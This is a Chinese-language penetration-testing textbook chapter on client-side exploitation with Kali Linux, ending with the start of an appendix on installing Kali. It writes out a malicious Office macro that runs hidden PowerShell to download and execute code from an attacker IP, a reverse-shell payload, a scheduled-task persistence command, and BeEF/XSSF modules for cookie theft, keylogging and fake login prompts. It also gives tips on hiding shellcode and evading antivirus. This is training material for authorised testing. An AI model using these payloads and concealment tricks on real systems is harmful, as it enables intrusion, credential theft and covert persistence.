  \n• 它们已经是目标自然运行环境的一部分；攻击者不需要向目标系统传输大型编译器或其他辅助文件（如加密应用程序）。\n• 脚本语言的设计初衷是便于计算机操作，如配置管理和系统管理。例如，它们可以用于发现和更改系统配置、访问注册表、执行程序、访问网络服务和数据库，以及通过\
  \ HTTP 或电子邮件移动二进制文件。此类标准的脚本操作可以很容易地被测试人员采用。\n• 因为它们是操作系统环境的原生的，所以通常不会触发杀毒软件告警。\n\
  • 它们很容易使用，因为编写脚本只需要一个简单的文本编辑器。\n\n使用脚本发起攻击没有任何障碍。\n\n从历史上看，`JavaScript` 由于其在大多数目标系统上的广泛可用性，是攻击的首选脚本语言。由于\
  \ `JavaScript` 攻击已经有了很好的描述，我们将关注 Kali 如何利用较新的脚本语言促进攻击：`VBScript` 和 `PowerShell`。\n\
  \n### 使用 VBScript 进行攻击\n\n`Visual Basic Scripting Edition`（`VBScript`）是微软开发的一种 `Active\
  \ Scripting language`。它被设计为一种轻量级的 Windows 原生语言，可以执行小型程序。自 Windows 98 以来，每个 Microsoft\
  \ Windows Windows 版本都默认安装了 `VBScript`，使其成为客户端攻击的极佳目标。\n\n要使用 `VBScript` 发起攻击，我们将从命令行调用\
  \ Metasploit 的 `msfpayload`：\n\n```\nroot@kali:~# msfpayload windows/meterpreter/reverse_tcp\
  \ LHOST=[本地主机] LPORT= [本地端口] V\n```\n\n[286]\n\n## 第 11 章\n\n注意 `V` 表示输出为一个 VBS\
  \ 宏脚本。输出将以带有两个特定部分的文本文件形式出现，如下：\n\n![](img/index-304_1.png)\n\n要使用该脚本，打开 Microsoft\
  \ Office 文档并创建一个宏（具体命令取决于所使用的 Microsoft Windows 版本）。将下方信息框提供的文本的第一部分（从 `Auto_Open()`\
  \ 到最后的 `End Sub`）复制到宏编辑器中并启用宏保存。\n\n```\n'**************************************************************\n\
  '*\n'* 宏代码\n'*\n'**************************************************************\n\
  Sub Auto_Open()\nFfqsm12\nEnd Sub\n\n// 为了清晰起见删除了额外的代码\n\nSub Workbook_Open()\n\
  Auto_Open\nEnd Sub\n```\n\n[287]\n\n## 客户端漏洞利用\n\n接下来，将 shellcode 复制到实际文档中。下面的截图显示了\
  \ shellcode 的部分：\n\n![](img/index-305_1.png)\n\nshellcode 可以识别为可能用于攻击的脚本，因此你可能希望通过减小字体大小并使颜色与文档背景匹配来隐藏或混淆\
  \ shellcode。\n\n攻击者必须在 Metasploit 上设置监听器。在命令提示符处输入 `msfconsole` 后，攻击者通常会输入以下命令并设置主机、端口和有效负载的选项；此外，攻击者将配置连接自动迁移到更稳定的\
  \ `explorer.exe` 进程，如下命令行所示。\n\n```\nmsf>use exploit/multi/handler\nmsf>set lhost\
  \ 192.168.43.130\nmsf>set lport 4444\nmsf>set payload windows/meterpreter/reverse_tcp\n\
  msf>set autorunscript migrate -n explorer.exe\nmsf >exploit\n```\n\n当文件发送到目标时，打开它时会弹出安全警告；因此，攻击者将使用社会工程学强迫预期受害者选择\
  \ `Enable`（启用）选项。实现此目的常用方法之一是将宏嵌入到配置为游戏的 Microsoft Word 或 Excel 表格中。\n\n启动文档将创建一个返回到攻击者的反向\
  \ shell，允许攻击者确保与目标的连接并进行漏洞后活动。\n\n为了扩展这种攻击方法，可以使用位于 `/usr/share/metasploit-framework/tools`\
  \ 的 `exe2vba.rb` 将任何可执行文件转换为 VBScript。\n\n[288]\n\n## 第 11 章\n\n例如，使用 Metasploit\
  \ 框架创建一个后门。注意 `X` 表示后门将作为可执行文件（`attack.exe`）创建，如下截图所示：\n\n![](img/index-306_1.png)\n\
  \n接下来，使用以下命令执行 `exe2vba` 将可执行文件转换为 VBScript：\n\n```\n# ruby exe2vba.rb attack.exe\
  \ attack.vbs\n[*] 将 73802 字节的 EXE 转换为 VBA 脚本\n```\n\n这将允许将可执行文件放在启用宏的 Microsoft\
  \ 文档中并发送给客户端。\n\n\n\n\n# PowerShell\n\nWindows PowerShell 是一种命令行 shell 和脚本语言，旨在用于系统管理。它基于\
  \ .NET 框架，扩展了 VBScript 提供的功能。该语言本身具有很强的扩展性。由于它是构建在 `.NET` 库之上的，你可以引入来自 `C#` 或 `VB.NET`\
  \ 等语言的代码。你还可以利用第三方库。尽管具有这种扩展性，它仍然是一种非常简洁的语言。需要超过 100 行代码的 VBScript 可以缩减为仅 10 行 PowerShell！\n\
  \n也许，PowerShell 最强大的特性是它在大多数现代 Windows 操作系统（Windows 7 及更高版本）上默认可用，且无法被删除。\n\n[289]\n\
  \n## 客户端攻击\n\n我们将使用 Metasploit Framework 包含的 PowerShell 脚本来支持杀伤链的攻击阶段。\n\n要启动攻击，我们将使用\
  \ Metasploit Framework 中的 PowerShell Payload Web Delivery 模块。该模块的目的是在目标系统中快速建立会话。攻击不会写入磁盘，因此不太可能触发客户端反病毒软件的检测。攻击的启动和可用的模块选项如下截图所示：\n\
  \n![](img/index-307_1.png)\n\nMetasploit Framework 将生成一个单行宏，可以将其嵌入文档中并用于启动攻击，样本代码所示：`Sub\
  \ AutoOpen()`\n\n```bash\nSub AutoOpen()\nCall Shell(\"PowerShell.exe -w hidden\
  \ -nop -ep bypass -c \"\"IEX ((new-object net.webclient).downloadstring('http://192.168.1.102:4444/boom'))\"\
  \",1)\nEnd Sub\n```\n\n在攻击完成之前，攻击者必须为传入的 shell 准备一个监听器（`URIPATH` 是 Metasploit 随机生成的；确保为监听器设置了正确的\
  \ `URIPATH`）。创建监听器的命令如下：`msf> use exploit/windows/misc/psh_web_delivery`, `msf exploit(psh_web_delivery)\
  \ > set SRVHOST 192.168.1.102`, `msf exploit(psh_web_delivery) > set URIPATH boom`,\
  \ `msf exploit(psh_web_delivery) > exploit`。\n\n[290]\n\n## 第 11 章\n\n成功的攻击将在攻击者的系统上创建一个交互式\
  \ shell。\n\n可以使用 `schtask` 命令使 `psh_web_delivery` 持久化。以下命令将创建一个名为 `MSOfficeMngmt`\
  \ 的计划任务，该任务将在登录时执行 `powershell.exe`（默认位于 `\\Windows\\system32` 目录）：`schtasks /create\
  \ /tn MSOfficeMngmt /tr \"powershell.exe -WindowsStyle hidden -NoLogo -NonInteractive\
  \ -ep -bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.1.104:4444/boom''))'\"\
  \ /sc onlogon /ru System`\n\n用于支持攻击后活动的额外 PowerShell 脚本可以在 Kali 的 PowerSploit 目录中找到。尽管\
  \ PowerShell 具有灵活性，但它也有一些缺点。\n\n例如，如果终端用户在应用持久化机制之前关闭了包含宏的文档，连接将会丢失。\n\n更重要的是，像\
  \ VBScript 和 PowerShell 这样的脚本仅对微软环境有效。为了扩大客户端攻击的范围，我们需要寻找一种通用的客户端漏洞，无论其操作系统环境如何都能被利用。此类漏洞的一个特定例子就是跨站脚本攻击。\n\
  \n## 跨站脚本框架\n\n据报道，跨站脚本（`XSS`）漏洞是网站中最常见的可利用漏洞。据估计，它们存在于高达 80% 的应用程序中。\n\nXSS 漏洞发生在应用程序（通常是基于\
  \ Web 的）违反了被称为“同源策略”（`same-origin policy`）的信任概念，并显示了用户提供的未经清理以移除恶意语句的内容。\n\nXSS\
  \ 漏洞至少有两种主要类型：`non-persistent`（非持久型）和 `persistent`（持久型/存储）。\n\n最常见的类型是非持久型或反射型漏洞。当客户端提供的数据被服务器立即用于显示响应时就会发生此类漏洞。此类攻击可以通过电子邮件或提供\
  \ URL 的第三方网站发生，该 URL 引用了受信任网站但包含 XSS 攻击代码。如果受信任网站容易这种特定攻击，执行该链接可能会导致受害浏览器执行恶意脚本，从而可能导致系统被破坏。\n\
  \n[291]\n\n## 客户端攻击\n\n持久化（存储）XSS 漏洞发生在攻击者提供的数据被服务器保存，然后在用户浏览过程中永久地在受信任的网页上显示给其他用户时。这通常发生在允许用户发布\
  \ HTML 格式消息的在线论坛和博客中。攻击者可以在网页上放置一个对访问用户不可见的恶意脚本，但该脚本会损害访问受影响页面的访问者。\n\nKali Linux\
  \ 上存在多种用于寻找 XSS 漏洞的工具，包括 `xsser` 和各种漏洞扫描器。然而，有一些工具允许测试人员完全利用 XSS 漏洞。\n\n跨站脚本框架（`XSSF`）是一个多平台安全工具，它利用\
  \ XSS 漏洞与目标建立通信信道，支持：\n\n- 对目标浏览器进行侦察（指纹识别和访问过的 URL）、对目标主机（检测虚拟机、获取系统信息）以及内部网络进行侦察。\n\
  - 向目标发送警告。这种简单的“攻击”可以模拟登录提示并获取凭据。\n- 窃取 Cookie 以便攻击者伪造。\n- 将目标重定向到另一个网页。恶意网页可能会自动向目标下载漏洞程序。\n\
  - 向目标加载 PDF 文件或 Java Applet，或从 Android 移动设备提取 SD 卡内容。\n- 启动 Metasploit 攻击，以及拒绝服务攻击。\n\
  - 启动社交工程攻击，包括自动填充窃取、点击劫持、Clippy、伪造更新、钓鱼和标签切换。\n\n此外，`XSSF Tunnel` 函数允许攻击者伪造受害者并使用其凭据和会话浏览网站。这是访问公司内部网的一种有效方法。该\
  \ API 文档齐全，便于创建新的攻击模块。由于它是用 Ruby 编写的，该 API 与 Metasploit Framework 集成，允许攻击者发起额外的攻击。\n\
  \n[292]\n\n## 第 11 章\n\n使用 `XSSF` 需要按照以下步骤安装和配置以支持攻击：\n\n1. Kali 不自带 XSSF。首先，用户必须打开终端窗口并使用以下命令设置目录：`root@kali:~#\
  \ cd /opt/metasploit/apps/pro/msf3`\n\n2. 使用以下命令安装 XSSF：`svn export http://xssf.googlecode.com/svn/trunk\
  \ ./ --force`。确保使用的是 `svn export` 而不是 `svn checkout`，后者会破坏现有的 MSF svn 文件。安装成功的片段如下截图所示：\n\
  \n![](img/index-310_1.png)\n\n3. 从 Metasploit Framework 控制台，使用 `load xssf` 命令加载\
  \ XSSF 插件，如下截图所示：\n\n![](img/index-310_2.png)\n\n[293]\n\n## 客户端攻击\n\n4. 通过输入 `helpxssf`\
  \ 识别 XSSF 命令，如下截图所示：\n\n\n\n\n\n![](img/index-311_1.png)\n\n5. 从控制台，使用以下命令访问与插件相关的\
  \ URL：\n\n`msf>xssf_urls`\n\n上一条命令的执行结果如下所示，如你所见，识别出了几个 URL：\n\n![](img/index-311_2.png)\n\
  \n最重要的 URL 是 XSSF 服务器，它位于 localhost。还识别出了其他几个 URL，包括：\n\n- 通用 XSS 注入：这是你试图让受害者点击或执行的目标对象。\n\
  \n**[ 294 ]**\n\n## 第 11 章\n\n- XSSF 测试页面：XSSF 提供了访问一个易受 XSS 攻击的本地测试面的权限。这可以在实际测试启动攻击之前，用于验证攻击和结果。\n\
  \n- XSSF 隧道代理（XSSF Tunnel Proxy）：XSSF 允许攻击者使用被攻破主机的身份进行冲上网，同时保留自己的安全身份。\n\n- XSSF\
  \ 日志页面：该页面记录了攻击和收到的信息。遗憾的是，日志页背景非常深，很难看到返回的信息。在测试期间，我们通常通过命令行访问日志信息，这样更整洁且可以编写脚本。\n\
  \n- XSSF 统计页面。 XSSF 帮助页面。\n\n我们将使用漏洞 Web 应用程序 `Mutillidae` 来演示 XSSF。`Mutillidae`\
  \ 是 Metasploitable 项目的一部分，可以从 http://sourceforge.net/projects/metasploitable/files/Metasploitable2/\
  \ 下载。请参考*附录*、*安装 Kali Linux* 获取关于安装此漏洞靶的说明。\n\n6. 一旦打开 `Mutillidae`，导航到博客页面；该页面众之易受\
  \ XSS 攻击（你可以对 `Mutillidae` 使用漏洞扫描工具来识别其他潜在的插入点）。\n\n若要对目标客户端发起攻击，不要在博客中输入普通文章。相反，请输入包含目标\
  \ URL 和端口的脚本元素：\n\n接下来的截图显示了攻击代码在目标网站博客页面上的放置位置。\n\n![](img/index-312_1.png)\n\n\
  **[ 295 ]**\n\n### 客户端漏洞利用\n\n当输入这些内容并受害者点击 **Save Blog Entry**（保存博客条目）时，他们的系统将被攻破。通过\
  \ Metasploit Framework 控制台，测试人员可以使用 `xssf_victims` 和 `xssf_information` 命令获取每个受害者的信息。执行\
  \ `xssf_victims` 命令后，将显示每个受害者的信息，如下所示：\n\n![](img/index-313_1.png)\n\n此时常见的 XSS\
  \ 攻击是向客户端发送一条简短且相对无害的消息或 `alert`。使用 Metasploit Framework，可以通过输入以下命令相对简单地实现：\n\n\
  ```\nmsf > use auxiliary/xssf/public/misc/alert\nmsf auxiliary(alert) > show options\n\
  ```\n\n在查看选项后，可以从命令行快速发送 `alert`，如下所示：\n\n**[ 296 ]**\n\n## 第 11 章\n\n![](img/index-314_1.png)\n\
  \n受害者将看到一条消息，如下所示：\n\n![](img/index-314_2.jpg)\n\n通常情况下，大多数测试人员及其客户都使用此类简单的 alert\
  \ 消息来验证跨站脚本。这些消息证明了“漏洞”的存在。\n\n然而，简单的 alert 缺乏情感冲击。很多时候，它们识别出了真实的漏洞，但客户并不会响应和修复该漏洞，因为\
  \ alert 消息被认为不是重大威胁。幸运的是，XSSF 允许测试人员“加大筹码”，演示更复杂、更危险的攻击。\n\n可以使用以下命令 窃取 cookie：`msf>\
  \ use auxiliary/xssf/public/misc/cookie`\n\n```\nmsfauxillary(cookie) > show options\n\
  (确保选择了所有需要的选项)\nmsfauxillary(cookie) > run\n```\n\n**[ 297 ]**\n\n### 客户端漏洞利用\n\n\
  `run` 命令的执行结果如下所示：\n\n![](img/index-315_1.png)\n\n攻击完成后，可以通过查看 XSSF 日志页面上的结果，或直接在命令行中使用该命令找到\
  \ cookie，如下所示：\n\n![](img/index-315_2.png)\n\n`auxiliary/xssf/public/misc` 中的其他实用命令包括：\n\
  \n- `check_connected`：此命令检查受害者是否打开了任何社交网站（Gmail、Facebook 或 Twitter）\n- `csrf`：它启动跨站请求伪造攻击\n\
  - `keylogger`：此命令在客户端调用键盘记录器\n- `load_applet` 和 `load_pdf`：这些命令在客户端加载敌意的 Java applets\
  \ 和 PDF 文件，并调用它们来启动预配置的恶意软件\n- `redirect`：它将客户端重定向到指定的网页\n- `webcam_capture`：此命令从客户端的摄像头中捕捉图像\n\
  \n这是一个不完整的列表，但它展示了该工具开发的程度。此外，还有一些用于网络扫描和发起拒绝服务攻击的模块，以及一些确保在攻击完成后保持持久性的模块。\n\nXSSF\
  \ 还可以配合 `ettercap` 使用来攻破内部网络。例如，可以使用 `ettercap` 通过在名为 `attack` 的过滤器放置以下代码替换数据为指向恶意页面的链接：\n\
  \n```\nif (ip.proto == TCP && tcp.src == 80) {\n    if(search(DATA, \"\")) {\n```\n\
  \n**[ 298 ]**\n\n## 第 11 章\n\n必须使用命令将过滤器脚本转换为二进制文件：`etterfilter attack.filter -o\
  \ attack.ef`\n\n要对网络上的所有用户发动攻击，使用以下命令执行 `ettercap`：`ettercap -T -q -F attack.ef\
  \ -M`\n\nXSSF，特别是当集成到 Metasploit Framework 时，是一个利用 XSS 的非常强大的工具。然而，最近出现了一个新星可以帮助你实现类似的攻击：Browser\
  \ Exploitation Framework。\n\n**Browser Exploitation Framework – BeEF** BeEF 是一个专注于特定客户端应用程序——网络浏览器的利用工具。BeEF\
  \ 允许攻击者通过 XSS 或 SQL 注入等攻击向漏洞的 HTML 代码中注入 JavaScript 代码。这种利用代码被称为 `hook`。当 `hook`\
  \ 被浏览器执行时，即实现了攻破。浏览器（`zombie`）连接回 BeEF 应用，BeEF 为浏览器提供 JavaScript 命令或模块。BeEF 的模块执行诸如下的任务：\n\
  \n- 对被攻破的浏览器进行指纹识别和侦察。它也可以作为一个平台，评估漏洞的存在及其在不同浏览器下的行为。\n- 对目标主机进行指纹识别，包括虚拟机的存在。\n\
  \n**[ 299 ]**\n\n### 客户端漏洞利用\n\n- 检测客户端上的软件（仅限 Internet Explorer）并获取 Program Files\
  \ 和 Program Files (x86) 目录的列表。这可以识别其他可以利用以巩固我们对客户端控制的应用程序。\n- 使用损坏系统的摄像头拍摄照片；这些照片在报告中具有重大影响。\n\
  - 对受害者的数据文件进行搜索，并窃取可能包含身份凭据（剪贴板内容和浏览器 cookie）或其他有用信息。\n- 实现浏览器按键记录。\n- 使用 ping 扫描进行网络侦察，并识别网络设备以及扫描开放端口。\n\
  - 从 Metasploit Framework 发起攻击。\n- 使用隧道代理扩展利用被攻破的网络浏览器安全权限攻击内部网络。\n\n\n\n\n由于 BeEF\
  \ 是用 Ruby 编写的，它支持多种操作系统（Linux、Windows 和 OS X）。更重要的是，在 BeEF 中很容易自定义新模块并扩展其功能。\n\n\
  # 安装和配置浏览器\n\n### 漏洞利用框架\nBeEF 并不是 Kali 发行版的一部分，但它包含了所需的依赖以支持在 Kali 中自动安装。要安装 BeEF，请使用以下命令：\n\
  \n```bash\nroot@kali:~# apt-get install beef-xss\n```\n\nBeEF 将安装在 `/usr/share/beef-xss`\
  \ 目录下。默认情况下，它没有与 Metasploit Framework 集。要集成 BeEF，你需要执行以下步骤：\n\n1. 编辑位于 `/usr/share/beef-xss/config.yaml`\
  \ 的主配置文件，内容如下：\n```yaml\nmetasploit:\n  enable:true\n```\n\n[300]\n\n## 第 11 章\n\
  \n2. 编辑位于 `/usr/share/beef-xss/extensions/metasploit/config.yml` 的文件。你需要修改 `host`、`callback_host`\
  \ 以及 `os 'custom'`、`path` 行，以包含你的 IP 地址和 Metasploit Framework 的位置。正确编辑后的 `config.yml`\
  \ 文件如图所示：\n\n![](img/index-318_1.png)\n\n3. 启动 `msfconsole` 并加载 `msgrpc` 模块，下图所示。请确保你也包含了密码：\n\
  \n![](img/index-318_2.png)\n\n4. 使用以下命令启动 BeEF：\n\n```bash\nroot@kali:~# cd /usr/share/beef-xss\n\
  root@kali:/usr/share/beef-xss~# ./beef\n```\n\n[301]\n\n## 客户端攻击\n\n5. 通过查看程序启动期间生成的消息来确认启动。这些消息应该显示已发生\
  \ `Successful connection with Metasploit`，并伴随着 Metasploit 漏洞已加载的指示。程序成功启动的截图所示：\n\
  \n![](img/index-319_1.png)\n\n当你重启 BeEF 时，使用 `-x` 选项重置数据库。\n\n在本示例中，BeEF 服务器运行在\
  \ `192.168.222.129` 上，“钩子 URL”（我们希望目标激活的那个）为 `192.168.222.129:80/hook.js`。\n\nBeEF\
  \ 的大部分管理和控制通过 Web 界面完成。要访问控制面板，请前往 `http://<ip address>:3000/ui/panel`。\n\n默认登录凭据为\
  \ `Username:beef` 和 `Password:beef`，所示，除非在 `config.yaml` 中更改了它们。\n\n[302]\n\n##\
  \ 第 11 章\n\n![](img/index-320_1.png)\n\n### BeEF 浏览器演示\n当 BeEF 控制面板启动时，它将显示 `Getting\
  \ Started` 屏幕，其中包含在线网站以及用于验证各种攻击的演示页链接。BeEF 控制面板所示：\n\n![](img/index-320_2.jpg)\n\
  \n[303]\n\n## 客户端攻击\n\n如果你已经挂钩了一个受害者，界面将分为两个面板：\n\n- 在面板左侧的 `Hooked Browsers`（挂钩浏览器）中，测试人员可以看到列出的每个连接浏览器，并带有其主机操作系统、浏览器类型、IP\
  \ 地址和已安装插件的信息。由于 BeEF 设置了 Cookie 来识别受害者，它可以追溯这些信息并维护一致的受害者列表。\n- 面板右侧是启动所有操作并获取结果的地方。在\
  \ `Commands`（命令）选项卡中，我们看到一个针对挂钩浏览器的不同攻击向量的分类库。此视图将根据每个浏览器的类型和版本而异。\n\nBeEF 使用颜色编码方案根据命令对特定目标的可用性对对其进行表征。使用的颜色如下：\n\
  \n- **绿色**：表示该命令模块对目标有效，并且应该被受害者检测。\n- **橙色**：表示该命令模块对目标有效，但可能会被受害者检测。\n- **灰色**：表示该命令模块尚未针对目标进行验证。\n\
  - **红色**：表示该命令模块对目标无效。可以使用，但不能保证其成功，且其使用可能会被目标检测。\n\n在使用这些指标时请保持谨慎，因为客户端环境的变化可能会导致某些命令失效，或可能导致其他非预期的结果。\n\
  \n要开始攻击或挂钩受害者，我们需要让用户点击钩子 URL，其格式为 `<ip address>:<port>/hook.js`。这可以通过多种手段实现，包括：\n\
  \n- 原始 XSS 漏洞\n- 中间人攻击（特别是使用 `BeEF Shank`，一种专门针对内部网络内网站点的 ARP` 欺骗工具）\n- 社会工程攻击，包括\
  \ BeEF Web 克隆器和批量邮件发送、带有 iFrame 伪装的自定义挂钩点或二维码生成器\n\n一旦浏览器被挂钩，它被称为“僵尸”（zombie）。从\
  \ `Hooked Browsers` 面板中选择僵尸的 IP 地址。\n\n[304]\n\n## 第 11 章\n\n### 客户端攻击\n在如下所示的示例中，受害者有多个选项可用。最容易使用的攻击之一是社会工程。当从\
  \ `Commands` 下的 `Module Tree` 选择 `Clippy` 时，最右侧会启动一个特定的 `Clippy` 面板，所示：\n\n![](img/index-322_1.png)\n\
  \n[305]\n\n## 客户端攻击\n当执行 `Clippy` 时，受害者将看到如下所示的消息：\n\n![](img/index-323_1.png)\n\
  \n[306]\n\n## 第 11 章\n\n比较有趣的攻击之一是 `Pretty Theft`，它向用户索要热门网站的用户名和密码。例如，测试人员可以配置\
  \ Facebook 的 `Pretty Theft`选项，所示：\n\n![](img/index-324_1.png)\n\n当攻击执行时，受害者会看到一个看起来合法的弹出窗口，所示：\n\
  \n![](img/index-324_2.png)\n\n[307]\n\n## 客户端攻击\n在 BeEF 中，测试人员查看攻击的历史日志，并可以从 `Command\
  \ results` 列中的 `data` 字段推导出用户名和密码，所示：\n\n![](img/index-325_1.png)\n\n### 集成 BeEF\
  \ 和 Metasploit 攻击\nBeEF 和 Metasploit Framework 都是用 Ruby 开发的，可以协同工作来利用目标。由于它使用客户端和服务器指纹来表征目标，`browser_autopwn`\
  \ 是最成功的攻击之一。\n\n\n\n\n\n一旦目标被挂钩（hook），启动 Metasploit 控制台并使用以下命令配置攻击：\n\n```\nmsf\
  \ > use auxiliary/server/browser_autopwn\nmsf auxiliary(browser_autopwn) > set LHOST\
  \ 192.168.43.130\nmsf auxiliary(browser_autopwn) > set PAYLOAD_WIN32\nwindows/meterpreter/reverse_tcp\n\
  msf auxiliary(browser_autopwn) > set PAYLOAD_JAVA\njava/meterpreter/reverse_tcp\n\
  msf auxiliary(browser_autopwn) > exploit\n```\n\n等待所有相关的漏洞利用完成加载。在接下来的截图示例中，加载了\
  \ 18 个漏洞利用程序。请注意攻击的目标 URL。在此示例中，目标 URL 为 `http://192.168.43.130:8080/ICprp4Tnf4Z`：\n\
  \n![](img/index-325_2.png)\n\n[308]\n\n# 第 11 章\n\n有多种方法可以引导浏览器点击目标 URL，但是，如果我们已经挂钩了目标浏览器，就可以使用\
  \ BeEF 的重定向功能。在 BeEF 控制面板中，转到 **Browser** | **Hooked Domain** | **Redirect Browser**。在提示出现时，使用此模块指向目标\
  \ URL，然后执行攻击。\n\n在 Metasploit 控制台中，你将看到选定的攻击正连续针对目标启动。成功的攻击将打开一个 Meterpreter 会话，如下截图所示：\n\
  \n![](img/index-326_1.png)\n\n要查看与受害目标的打开会话列表，请输入 `sessions -l`。要与特定会话进行交互连接（例如\
  \ `session 1`），输入 `sessions -i 1`。\n\n## 使用 BeEF 作为隧道代理\n\n隧道技术（Tunneling）是将载荷协议封装在交付协议（如\
  \ IP）内部的进程。通过隧道技术，你可以跨网络传输不兼容的协议，或者绕过配置为阻止特定协议的防火墙。BeEF 可以配置为模拟反向 HTTP 代理的隧道代理：浏览器会话变成隧道，被挂钩的浏览器成为出口。当内部网络被攻破时，这种配置非常有用，因为隧道代理可以用于：\n\
  \n• 在受害者浏览器的安全上下文中（客户端 SSL 证书、身份验证 Cookie、NTLM 哈希等）浏览已验证站点\n• 使用受害者浏览器的安全上下文对挂钩域名进行爬虫\n\
  • 方便使用 SQL 注入等工具\n\n[309]\n\n## 客户端攻击\n\n要使用隧道代理，选择你想要针对的挂钩浏览器并右键点击其 IP 地址。在弹出的框中（如下截图所示），选择\
  \ **Use as Proxy** 选项：\n\n![](img/index-327_1.jpg)\n\n配置浏览器使用 BeEF 隧道代理作为 HTTP 代理。默认情况下，代理地址为\
  \ `127.0.0.1`，端口为 `6789`。\n\n如果你使用配置为 HTTP 代理的浏览器访问目标网站，所有的原始请求/响应对都将存储在 BeEF 数据库中，可以通过导航到\
  \ **Rider** | **History** 进行分析（接下来的截图显示了日志摘要）。\n\n![](img/index-327_2.png)\n\n一旦攻击完成，有一些机制可以确保保持持久化连接，包括：\n\
  \n• **Confirm close**（确认关闭）：该模块会在受害者尝试关闭标签页时，向其弹出 **Confirm Navigation --are you\
  \ sure you want to leave this page**（确认导航--你确定要离开此页面吗？）。如果用户选择 **Leave this Page**（离开此页面），将无效，且\
  \ **Confirm Navigation** 弹出窗口将继续出现。\n• **Pop-under module**（弹出窗口模块）：该模块配置在 `config.yaml`\
  \ 中自动运行。该模块尝试在受害者关闭主标签页时打开一个小弹出窗口以保持浏览器挂钩。这可能会被弹出拦截器拦截。\n\n[310]\n\n# 第 11 章\n\n\
  • **iFrame keylogger**：网页上所有的链接重写为 iFrame 覆盖，其高度和宽度占原来的 100%。为了达到最大的效果，它应该附加 JavaScript\
  \ 密钥记录器。理想情况下，你会加载挂钩域名的登录页面。\n• **Man-in-the-browser**（浏览器中间人）：该模块确保受害者只要点击任何链接，下一个页面也会被挂钩。避免这种行为的唯一方法是在地址栏中输入新地址。\n\
  \n最后，尽管 BeEF 提供了一系列极好的模块来执行侦察以及杀伤链中的攻击和攻击后阶段，但 BeEF 已知的默认活动（`/hook.js` 和服务器头）正被用于检测攻击，这降低了它的有效性。测试人员将使用\
  \ Base64 编码、空白编码、变量随机化和删除注释等技术对攻击进行混淆，以确保未来的完全有效。\n\n## 总结\n\n在本章中，我们研究了通常与保护网络隔离的系统的攻击。这些客户端攻击侧重于特定应用程序中的漏洞。我们回顾了恶意脚本，特别是\
  \ VBScript 和 PowerShell，它们在测试和攻破基于 Windows 的网络时特别有用。然后我们研究了跨站脚本框架（XSS Framework），它可以利用\
  \ XSS 漏洞以及相关工具。\n\n[311]\n\n# 安装 Kali Linux\n\nKali Linux 是一种基于 Linux 的操作系统，支持数百种用于安全审计的应用程序。其复杂性与其与其安装方法的多样性相匹配。本章将涵盖安装\
  \ Kali 时需要考虑的因素，并重点介绍如何尽快启动虚拟机。它还将检查如何设置和维护它。\n\n## 下载 Kali Linux\n\n下载和安装 Kali\
  \ Linux 有多种选择。在出版时，最新版本为 1.06；然而，1.07 版本即将发布。当前版本可以从官方网站（www.kali.org/downloads/）获取\
  \ 32 位和 64 位编译版本。\n\n**Offensive Security** 提供了 `ARM` 处理器的预配置版本（例如 Galaxy Note 10.1、树莓派和三星\
  \ Chromebook）供下载；支持 ARMEL 和 ARMHL 平台。此外，网上还有预制的 VMware 镜像 http://www.offensive-security.com/kali-llnux-vmware-arm-image-download/。\n\
  \n\n\n\n\n## Kali Linux 基础安装\n\n一旦获取了合适的 Kali Linux 发行版，必须对其进行安装才能可以使用。有以下安装选项：\n\
  \n* 安装到 i386、AMD64 或 ARM 系统的硬盘上。设备启动时，Kali Linux 将是唯一的宿主机。\n* 双系统启动系统。通常在使用 MS Windows\
  \ 操作系统时选择此选项。在启动过程中，用户可以选择作为 Kali Linux 或 Windows 操作系统启动系统。这比直接将 Kali 安装到硬盘上更具灵活性；但它确实会让在两个系统之间来回切换变得困难。\n\
  * 直接安装到 DVD 驱动器或 USB 设备。如果主机系统可以配置为从 USB 设备启动，这种方法特别有用；但如果 USB 设备需要是 `persistent`（持久化的，即保留测试过程中对基础操作系统、应用程序和数据进行的所有更改），则需要额外的配置更改。\n\
  * 使用 VMware 或 VirtualBox 等产品作为虚拟机安装。我们发现这是支持渗透测试最灵活的选项。\n* Kali 支持两种类型的网络安装——`mini\
  \ ISO` 安装和 `network PXE` 安装。mini ISO 在系统上安装一个精简的 Kali 发行版，然后依赖快速网络连接来安装有效最终产品所需的其余应用程序。网络\
  \ PXE 安装在启动过程中支持终端（无光驱器且无 USB 端口），获取 IP 地址信息并安装 Kali。\n* Kali 现在可以从云端使用——Amazon\
  \ EC2 市场提供了 64 位精简版 镜像（https://aws.amazon.com/marketplace/pp/B00HW50E0M）。Kali 镜像是免费的，用户只需支付常规\
  \ AWS 使用费用。\n\n**[314]**\n\n附\n\n由于 Amazon 的规定，此版本的 Kali 默认使用 root 账户。一旦你从 Amazon\
  \ 获取了 SSH 密钥，必须以用户身份连接到 Kali 实例，然后 `sudo` 到 root。你可能需要下载额外的工具来支持测试。最后，你必须告知 Amazon\
  \ 它被用于合法的安全测试，而不是攻击工具。\n\n## 将 Kali Linux 安装到虚拟机\n\n在书中，Kali 被配置为 `virtual machine`（虚拟机，`VM`）。虚拟机用于渗透测试时具有以下优势：\n\
  \n* 可以开发和维护通用的测试虚拟机，确保测试人员熟悉工具集及其对典型目标系统的影响。\n* 虚拟机便于在宿主机和虚拟机操作系统之间快速切换，允许测试人员在\
  \ Windows 和 Linux 平台之间移动，以找到测试的最优工具组合。\n* 虚拟机是移动的——它们可以移动到不同的系统和操作系统平台上。\n* 虚拟机可以保留在库中以便回归测试。在用工具集验证了网络或系统的安全性后，测试人员通常会被问及他们的方法和工具是否能检测出测试时存在的某个特定漏洞。测试人员可以使用归档的虚拟机对该漏洞进行重新测试，以确定其是否能被检测到，或者网络是否面临攻击风险。\n\
  \n虽然可以下载预制的虚拟机，但大多数测试人员会使用经过验证的 ISO 镜像自行创建。该过程简单并由向导引导。例如，使用 VMware 的过程如下：\n\n1.\
  \ 选择 `Create a New Machine`（创建虚拟机）。\n2. 选择 ISO 镜像。\n3. 选择操作系统。\n4. 设置磁盘位置。\n5. 设置磁盘空间。\n\
  6. 检查硬件配置。\n7. 选择 `Graphical Install`（图形化安装）。\n8. 提示选择语言、时区、主机名并设置 root 密码。\n9.\
  \ 分区时，选择全盘加密。\n10. 虚拟机程序将完成分区，将更改写入磁盘，然后安装系统。\n11. 此时，系统已上线。\n\n**[315]**\n\n*安装\
  \ Kali Linux**\n\n## 全盘加密与销毁主密钥\n\n渗透测试人员通常持有敏感信息——成功的测试可能会揭示客户网络中的缺陷，甚至用于进行渗透测试的工具在某些司法管辖区可能是非法的。因此，测试人员经常使用全盘加密来保护他们的系统。\n\
